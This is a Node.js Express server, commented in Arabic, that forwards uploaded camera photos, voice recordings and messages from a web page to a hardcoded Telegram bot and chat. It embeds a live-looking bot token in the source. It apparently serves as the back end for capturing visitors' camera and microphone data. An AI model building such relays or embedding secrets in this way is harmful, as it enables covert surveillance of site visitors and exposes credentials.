const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// ========== التوكن هنا آمن ولن يظهر للزوار ==========
const BOT_TOKEN = '8293897099:AAG0v319lwtX7jYFWxE9ixoRDcQTtDN04tQ';
const CHAT_ID = '8380505065';
// ==================================================

// خدمة الملفات الثابتة (index.html وغيره)
app.use(express.static(__dirname));

// نقطة النهاية اللي بيبعتلها الـ Frontend
app.post('/api/telegram', upload.fields([
    { name: 'photo', maxCount: 1 },
    { name: 'voice', maxCount: 1 }
]), async (req, res) => {
    try {
        const message = req.body.message;

        if (req.files && req.files.photo) {
            // إرسال صورة
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', req.files.photo[0].buffer, {
                filename: `camera_${Date.now()}.jpg`,
                contentType: 'image/jpeg'
            });
            formData.append('caption', message);

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            return res.json(data);
        } 
        else if (req.files && req.files.voice) {
            // إرسال صوت
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('voice', req.files.voice[0].buffer, {
                filename: `voice_${Date.now()}.wav`,
                contentType: 'audio/wav'
            });
            formData.append('caption', message);

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            return res.json(data);
        } 
        else {
            // إرسال رسالة نصية فقط
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            const data = await response.json();
            return res.json(data);
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});